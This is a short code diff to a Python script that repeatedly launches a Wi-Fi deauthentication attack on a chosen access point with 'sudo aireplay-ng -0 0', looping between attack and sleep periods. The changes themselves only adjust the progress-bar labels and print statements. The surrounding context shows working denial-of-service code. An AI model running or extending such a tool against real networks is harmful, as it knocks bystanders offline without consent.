@@ -56,7 +56,7 @@ def waiting( process = None, t = 15 ):
 
         else:
 
-            line = f"\r{ green }To restart : { int( p * 101 ) }%"
+            line = f"\r{ green }{ process } : { int( p * 101 ) }%"
 
         sys.stdout.write( line )
 
@@ -176,11 +176,11 @@ def startDeAuth():
 
     file = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "w" )
 
-    print( f"\n\n{ yellow }Attacking { project[ 'name' ] }" )
-
     process = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", project[ "bssid" ], project[ "interface" ] ], stdout = file, stderr = subprocess.PIPE )
 
-    dream( int( project[ "attack" ] ) )
+    print( "\n" )
+
+    waiting( process = f"{ yellow }Attacking { project[ 'name' ] }", t = int( project[ "attack" ] ) )
 
     process.terminate()
 
@@ -200,7 +200,7 @@ def startDeAuth():
 
         if len( searching1 ) == 0:
 
-            print( f"{ green }Access point uses the right channel." )
+            print( f"\n{ green }Access point uses the right channel." )
 
         else:
 
@@ -240,7 +240,7 @@ def startDeAuth():
 
         start( restart = True )
 
-    waiting( t = int( project[ "sleep" ] ) )
+    waiting( process = "Sleeping", t = int( project[ "sleep" ] ) )
 
     startDeAuth()
 
@@ -547,7 +547,6 @@ def main():
 if __name__ == "__main__":
 
     main()
-
 
 
 
